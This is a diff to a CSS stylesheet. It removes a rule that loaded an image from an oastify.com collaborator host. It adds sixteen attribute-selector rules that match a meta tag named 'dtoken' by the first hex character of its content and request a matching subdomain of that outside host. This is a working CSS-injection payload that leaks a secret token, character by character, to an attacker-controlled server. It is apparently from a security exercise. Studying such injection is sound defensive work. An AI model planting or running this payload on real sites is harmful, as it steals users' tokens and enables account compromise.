@@ -1,6 +1,63 @@
-body {
-    background-image: url('https://img.freepik.com.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com');
+meta[name=dtoken][content^=a]{
+    background-image: url(https://a.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);
 }
-span.fs-4 {
-    color: black;
+
+meta[name=dtoken][content^=b]{
+    background-image: url(https://b.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);
+}
+
+meta[name=dtoken][content^=c]{
+    background-image: url(https://c.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);
+}
+
+meta[name=dtoken][content^=d]{
+    background-image: url(https://d.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);
+}
+
+meta[name=dtoken][content^=e]{
+    background-image: url(https://e.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);
+}
+
+meta[name=dtoken][content^=f]{
+    background-image: url(https://f.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);
+}
+
+meta[name=dtoken][content^=0]{
+    background-image: url(https://0.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=1]{
+    background-image: url(https://1.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=2]{
+    background-image: url(https://2.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=3]{
+    background-image: url(https://3.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=4]{
+    background-image: url(https://4.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=5]{
+    background-image: url(https://5.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=6]{
+    background-image: url(https://6.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=7]{
+    background-image: url(https://7.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=8]{
+    background-image: url(https://8.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
+}
+
+meta[name=dtoken][content^=9]{
+    background-image: url(https://9.4hmnuj5bvusx2xe95ez81uem1d74vyjn.oastify.com/);   
 }
